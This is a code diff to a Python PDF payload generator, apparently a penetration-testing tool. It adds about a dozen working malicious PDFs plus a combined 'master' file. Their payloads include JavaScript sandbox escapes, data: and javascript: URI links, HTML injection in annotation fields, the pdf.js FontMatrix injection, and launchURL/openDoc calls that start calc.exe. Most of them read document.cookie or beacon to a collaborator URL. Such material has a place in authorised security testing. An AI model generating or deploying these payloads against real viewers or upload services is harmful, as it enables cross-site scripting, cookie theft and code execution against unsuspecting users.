@@ -12,6 +12,7 @@ def generate_pdf_payloads(output_dir, burp_collab):
         'lfi': [],
         'xxe': [],
         'rce': [],
+        'xss': [],
     }
     
     ssrf_dir = output_dir / 'ssrf'
@@ -24,6 +25,8 @@ def generate_pdf_payloads(output_dir, burp_collab):
     xxe_dir.mkdir(exist_ok=True)
     rce_dir = output_dir / 'rce'
     rce_dir.mkdir(exist_ok=True)
+    xss_dir = output_dir / 'xss'
+    xss_dir.mkdir(exist_ok=True)
     
     pdf_header = b'%PDF-1.4\n'
     pdf_trailer = b'\n%%EOF'
@@ -1441,6 +1444,795 @@ startxref
     with open(rce_dir / "rce2_postscript.pdf", 'wb') as f:
         f.write(pdf_rce2_postscript.encode())
     
+    pdf_xss1_js_sandbox_bypass = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Names <<
+/JavaScript <<
+/Names [(test) 3 0 R]
+>>
+>>
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/S /JavaScript
+/JS (app.alert\\(1\\); Object.getPrototypeOf(function*(){{}}).constructor = null; ((function*(){{}}).constructor("document.write('<script>confirm(document.cookie);</script><iframe src={base_url}/xss1>');"))().next();)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss1_js_sandbox_bypass.pdf", 'wb') as f:
+        f.write(pdf_xss1_js_sandbox_bypass.encode())
+    
+    pdf_xss2_data_uri = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Annots [4 0 R]
+>>
+endobj
+4 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [100 100 200 200]
+/A <<
+/S /URI
+/URI (data:text/html,<script>alert\\(2\\);fetch('{base_url}/xss2');</script>)
+>>
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss2_data_uri.pdf", 'wb') as f:
+        f.write(pdf_xss2_data_uri.encode())
+    
+    pdf_xss3_annotation_injection = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Annots [4 0 R]
+>>
+endobj
+4 0 obj
+<<
+/Type /Annot
+/Rect [284.7745656638 581.6814031126 308.7745656638 605.6814031126]
+/Subtype /Text
+/M (D:20210402013803+02'00)
+/C [1 1 0]
+/T (\\">'><details open ontoggle=confirm\\(3\\);fetch('{base_url}/xss3');>)
+/P 3 0 R
+/Contents (\\">'><details open ontoggle=confirm('XSS');>)
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss3_annotation_injection.pdf", 'wb') as f:
+        f.write(pdf_xss3_annotation_injection.encode())
+    
+    pdf_xss4_uri_details = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Annots [4 0 R]
+>>
+endobj
+4 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [100 100 200 200]
+/A <<
+/S /URI
+/URI (\\">'><details open ontoggle=confirm\\(2\\);fetch('{base_url}/xss4');>)
+>>
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss4_uri_details.pdf", 'wb') as f:
+        f.write(pdf_xss4_uri_details.encode())
+    
+    pdf_xss5_js_bypass_apis = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Names <<
+/JavaScript <<
+/Names [(test) 3 0 R]
+>>
+>>
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/S /JavaScript
+/JS (app.alert\\(1\\); confirm\\(2\\); prompt\\(document.cookie\\); document.write\\("<iframe src='{base_url}/xss5'>"\\);)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss5_js_bypass_apis.pdf", 'wb') as f:
+        f.write(pdf_xss5_js_bypass_apis.encode())
+    
+    pdf_xss6_uri_javascript = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Annots [4 0 R]
+>>
+endobj
+4 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [100 100 200 200]
+/A <<
+/S /URI
+/URI (javascript:confirm\\(2\\);fetch('{base_url}/xss6');)
+>>
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss6_uri_javascript.pdf", 'wb') as f:
+        f.write(pdf_xss6_uri_javascript.encode())
+    
+    pdf_xss7_annotation_v = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Annots [4 0 R]
+>>
+endobj
+4 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [100 100 200 200]
+/V (\\">'></div><details/open/ontoggle=confirm(document.cookie);fetch('{base_url}/xss7');></details>)
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss7_annotation_v.pdf", 'wb') as f:
+        f.write(pdf_xss7_annotation_v.encode())
+    
+    pdf_xss8_fontmatrix = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Resources <<
+/Font <<
+/F1 5 0 R
+>>
+>>
+/Contents 6 0 R
+>>
+endobj
+4 0 obj
+<<
+/Type /FontDescriptor
+/FontName /SNCSTG+CMBX12
+>>
+endobj
+5 0 obj
+<<
+/BaseFont /SNCSTG+CMBX12
+/FontDescriptor 4 0 R
+/FontMatrix [ 1 2 3 4 5 (1\\); alert\\('origin: '+window.origin+', pdf url: '+\\\\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\\);fetch('{base_url}/xss8');) ]
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+6 0 obj
+<<
+/Length 0
+>>
+stream
+endstream
+endobj
+xref
+0 7
+trailer
+<<
+/Size 7
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss8_fontmatrix.pdf", 'wb') as f:
+        f.write(pdf_xss8_fontmatrix.encode())
+    
+    pdf_xss9_js_sandbox_bypass_apryse = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Names <<
+/JavaScript <<
+/Names [(test) 3 0 R]
+>>
+>>
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/S /JavaScript
+/JS (app.alert\\(1\\); console.println\\(delete window\\); console.println\\(delete confirm\\); console.println\\(delete document\\); window.confirm\\(document.cookie\\);fetch('{base_url}/xss9');)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss9_js_sandbox_bypass_apryse.pdf", 'wb') as f:
+        f.write(pdf_xss9_js_sandbox_bypass_apryse.encode())
+    
+    pdf_xss10_data_uri_simple = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Annots [4 0 R]
+>>
+endobj
+4 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [100 100 200 200]
+/A <<
+/S /URI
+/URI (data:text/html,<script>alert(1)</script>)
+>>
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss10_data_uri_simple.pdf", 'wb') as f:
+        f.write(pdf_xss10_data_uri_simple.encode())
+    
+    pdf_xss11_uri_javascript_simple = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Annots [4 0 R]
+>>
+endobj
+4 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [100 100 200 200]
+/A <<
+/S /URI
+/URI (javascript:alert(1))
+>>
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss11_uri_javascript_simple.pdf", 'wb') as f:
+        f.write(pdf_xss11_uri_javascript_simple.encode())
+    
+    pdf_xss12_js_simple = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Names <<
+/JavaScript <<
+/Names [(test) 3 0 R]
+>>
+>>
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/S /JavaScript
+/JS (app.alert(1);)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(xss_dir / "xss12_js_simple.pdf", 'wb') as f:
+        f.write(pdf_xss12_js_simple.encode())
+    
+    pdf_rce3_openDoc = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Names <<
+/JavaScript <<
+/Names [(test) 3 0 R]
+>>
+>>
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/S /JavaScript
+/JS (app.alert\\(1\\); app.openDoc("/C/Windows/System32/calc.exe");)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(rce_dir / "rce3_openDoc.pdf", 'wb') as f:
+        f.write(pdf_rce3_openDoc.encode())
+    
+    pdf_rce4_uri_start = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Annots [4 0 R]
+>>
+endobj
+4 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [100 100 200 200]
+/A <<
+/S /URI
+/URI (START C:/\\Windows/\\system32/\\calc.exe)
+>>
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(rce_dir / "rce4_uri_start.pdf", 'wb') as f:
+        f.write(pdf_rce4_uri_start.encode())
+    
+    pdf_rce5_launchURL = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Names <<
+/JavaScript <<
+/Names [(test) 3 0 R]
+>>
+>>
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/S /JavaScript
+/JS (app.alert\\(1\\); app.launchURL\\("START C:/\\Windows/\\system32/\\calc.exe", true\\); app.launchURL\\("javascript:confirm\\(3\\);", true\\);)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(rce_dir / "rce5_launchURL.pdf", 'wb') as f:
+        f.write(pdf_rce5_launchURL.encode())
+    
+    pdf_rce6_launchURL_file = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+/Names <<
+/JavaScript <<
+/Names [(test) 3 0 R]
+>>
+>>
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [4 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/S /JavaScript
+/JS (app.alert\\(1\\); app.launchURL\\("/C/Windows/system32/calc.exe", true\\); app.launchURL\\("'><details open ontoggle=confirm\\(3\\);", true\\);)
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(rce_dir / "rce6_launchURL_file.pdf", 'wb') as f:
+        f.write(pdf_rce6_launchURL_file.encode())
+    
+    pdf_lfi2_uri_file = f'''%PDF-1.4
+1 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Kids [3 0 R]
+/Count 1
+>>
+endobj
+3 0 obj
+<<
+/Type /Page
+/Parent 2 0 R
+/MediaBox [0 0 612 792]
+/Annots [4 0 R]
+>>
+endobj
+4 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [100 100 200 200]
+/A <<
+/S /URI
+/URI (file:///C:/Windows/system32/calc.exe)
+>>
+>>
+endobj
+xref
+0 5
+trailer
+<<
+/Size 5
+/Root 1 0 R
+>>
+startxref
+0
+%%EOF'''
+    with open(lfi_dir / "lfi2_uri_file.pdf", 'wb') as f:
+        f.write(pdf_lfi2_uri_file.encode())
+    
     pdf_master = f'''%PDF-1.4
 1 0 obj
 <<
@@ -1453,7 +2245,7 @@ startxref
 >>
 /Names <<
 /JavaScript <<
-/Names [(test) 6 0 R (iframe) 15 0 R (xhr) 16 0 R (fetch) 17 0 R]
+/Names [(test) 6 0 R (iframe) 15 0 R (xhr) 16 0 R (fetch) 17 0 R (xss1) 18 0 R (xss5) 19 0 R (xss9) 20 0 R]
 >>
 /EmbeddedFiles <<
 /Names [(evil.zip) 7 0 R]
@@ -1554,12 +2346,13 @@ endobj
 >>
 /Font <<
 /F1 5 0 R
+/F2 24 0 R
 >>
 /ColorSpace <<
 /CS1 11 0 R
 >>
 >>
-/Annots [12 0 R 13 0 R]
+/Annots [12 0 R 13 0 R 21 0 R 22 0 R 23 0 R]
 /Contents 14 0 R
 >>
 endobj
@@ -1629,11 +2422,78 @@ endobj
 /JS (fetch('{base_url}/fetch').then(async r=>app.alert(await r.text()));)
 >>
 endobj
+18 0 obj
+<<
+/S /JavaScript
+/JS (app.alert\\(1\\); Object.getPrototypeOf(function*(){{}}).constructor = null; ((function*(){{}}).constructor("document.write('<script>confirm(document.cookie);</script><iframe src={base_url}/xss1>');"))().next();)
+>>
+endobj
+19 0 obj
+<<
+/S /JavaScript
+/JS (app.alert\\(1\\); confirm\\(2\\); prompt\\(document.cookie\\); document.write\\("<iframe src='{base_url}/xss5'>"\\);)
+>>
+endobj
+20 0 obj
+<<
+/S /JavaScript
+/JS (app.alert\\(1\\); console.println\\(delete window\\); console.println\\(delete confirm\\); console.println\\(delete document\\); window.confirm\\(document.cookie\\);fetch('{base_url}/xss9');)
+>>
+endobj
+21 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [200 200 300 300]
+/A <<
+/S /URI
+/URI (data:text/html,<script>alert\\(2\\);fetch('{base_url}/xss2');</script>)
+>>
+>>
+endobj
+22 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [400 400 500 500]
+/A <<
+/S /URI
+/URI (javascript:confirm\\(2\\);fetch('{base_url}/xss6');)
+>>
+>>
+endobj
+23 0 obj
+<<
+/Type /Annot
+/Rect [284.7745656638 581.6814031126 308.7745656638 605.6814031126]
+/Subtype /Text
+/M (D:20210402013803+02'00)
+/C [1 1 0]
+/T (\\">'><details open ontoggle=confirm\\(3\\);fetch('{base_url}/xss3');>)
+/P 9 0 R
+/Contents (\\">'><details open ontoggle=confirm('XSS');>)
+>>
+endobj
+24 0 obj
+<<
+/BaseFont /SNCSTG+CMBX12
+/FontDescriptor 25 0 R
+/FontMatrix [ 1 2 3 4 5 (1\\); alert\\('origin: '+window.origin+', pdf url: '+\\\\(window.PDFViewerApplication?window.PDFViewerApplication.url:document.URL\\);fetch('{base_url}/xss8');) ]
+/Subtype /Type1
+/Type /Font
+>>
+endobj
+25 0 obj
+<<
+/Type /FontDescriptor
+/FontName /SNCSTG+CMBX12
+>>
+endobj
 xref
-0 18
+0 26
 trailer
 <<
-/Size 18
+/Size 26
 /Root 1 0 R
 >>
 startxref
